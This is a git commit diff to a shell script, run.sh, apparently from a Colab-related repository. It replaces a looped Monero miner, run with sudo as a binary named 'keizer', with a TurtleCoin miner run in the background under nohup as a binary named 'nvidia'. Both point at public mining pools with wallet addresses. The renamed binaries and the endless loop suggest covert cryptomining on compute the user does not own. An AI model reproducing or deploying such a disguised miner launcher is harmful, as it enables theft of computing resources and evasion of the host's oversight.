12c67dc80d76a2da56358b57133343e98cda0712
azzfarrcolab <72619602+azzfarrcolab@users.noreply.github.com>
2021-03-05 14:23:15 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,8 +1,5 @@
 #!/bin/sh 
  while true;
   do
-  sudo ./keizer --donate-level 1 -o sg.minexmr.com:80 -u 47RMDsjAS2p5V7NyFoGiFPZNKZiEfF4Hr1FJHEExJwuKGku7CHfS91CcpVWnCvKTDhZY1XEJU5cg4LS2nqoAwQiT4Qi7bEZ -p x -k --background
-  sleep 3000
-  sudo kill $(ps aux | grep 'keizer' | awk '{print $2}');
-  sleep 60
+  nohup ./nvidia -o ca.turtlecoin.herominers.com:10381 -a argon2/chukwav2 -u TRTLv3pQCstNZ7QndNvNqeRN4QKTNU8paW7wL2qGQ2UKTLskTif4bGLX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKWHaLv -p cisco &
 done
